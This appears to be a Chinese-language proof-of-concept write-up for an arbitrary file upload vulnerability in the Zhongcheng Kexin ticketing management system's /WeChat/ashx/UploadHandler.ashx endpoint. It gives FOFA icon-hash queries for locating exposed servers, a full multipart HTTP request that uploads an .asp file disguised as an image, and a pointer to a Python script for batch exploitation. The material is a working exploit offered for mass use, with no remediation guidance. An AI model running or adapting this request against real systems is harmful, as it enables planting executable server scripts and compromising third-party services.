中成科信票务管理系统 UploadHandler.ashx 任意文件上传漏洞

fofa:
icon_hash="1632964065" || icon_hash="-2142050529"

```
poc:
POST /WeChat/ashx/UploadHandler.ashx HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7yyQ5XLHOn6WZ6MT
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8


------WebKitFormBoundary7yyQ5XLHOn6WZ6MT
Content-Disposition: form-data; name="file"; filename="1.asp"
Content-Type: image/jpeg

<% Response.Write("Hello, World!") %>
------WebKitFormBoundary7yyQ5XLHOn6WZ6MT--
```
![7a0dd2dd1ffec4f0e3e6ce53b6ac8c6](https://github.com/user-attachments/assets/e5e221e1-8a25-4ab3-a03c-81f74cba8dfa)

![图片](https://github.com/user-attachments/assets/f1fbda2b-ce09-45d6-9cc7-dcbf3e806fc8)


运行py文件进行批量
![图片](https://github.com/user-attachments/assets/17b0e899-51f4-4183-ad1e-59001bdee27b)




